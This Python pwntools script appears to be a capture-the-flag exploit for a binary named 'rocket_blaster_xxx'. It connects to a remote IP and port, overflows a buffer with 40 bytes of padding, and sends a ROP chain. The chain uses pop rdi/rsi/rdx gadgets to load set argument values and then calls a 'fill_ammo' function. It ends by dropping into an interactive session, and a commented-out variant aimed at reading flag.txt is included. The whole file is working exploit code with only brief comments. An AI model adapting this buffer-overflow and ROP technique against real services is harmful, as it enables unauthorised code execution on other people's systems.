import pwn

from pwn import *
from struct import pack

# 0x401588 é o endereço do ret executado errado
# p = pwn.gdb.debug('./rocket_blaster_xxx', '''
# 	b *0x401588
# 	c
# ''')

p = remote('94.237.58.211', 43849)

binary = ELF('./rocket_blaster_xxx') # loading the binary into pwntools
context.binary = binary # setting up all pwntool settings suited for the binary
rop = ROP(binary) # loading our binary to look for gadgets and building rop chains
libc = ELF('./glibc/libc.so.6')
p.recvuntil(">>") # we tell pwntools to wait until it receives the string in stdout

libc.address = 0x00007ffff7c00000

pop_rdi = 0x40159f
pop_rsi = 0x40159d
pop_rdx = 0x40159b

fill_ammo_func = 0x004012f5

rop.raw("A"*40)
rop.raw(pop_rdi)
rop.raw(0xdeadbeef)
rop.raw(pop_rsi)
rop.raw(0xdeadbabe)
rop.raw(pop_rdx)
rop.raw(0xdead1337)
rop.raw(0x004015a0)
rop.raw(fill_ammo_func)

# rop.raw("A"*40)
# rop.raw(fill_ammo_func)
# rop.raw("flag.txt") # target libc
# rop.raw(0x004015a0)
# rop.raw(libc.symbols['read'])

p.sendline(rop.chain())

p.interactive() # to continue interacting with python
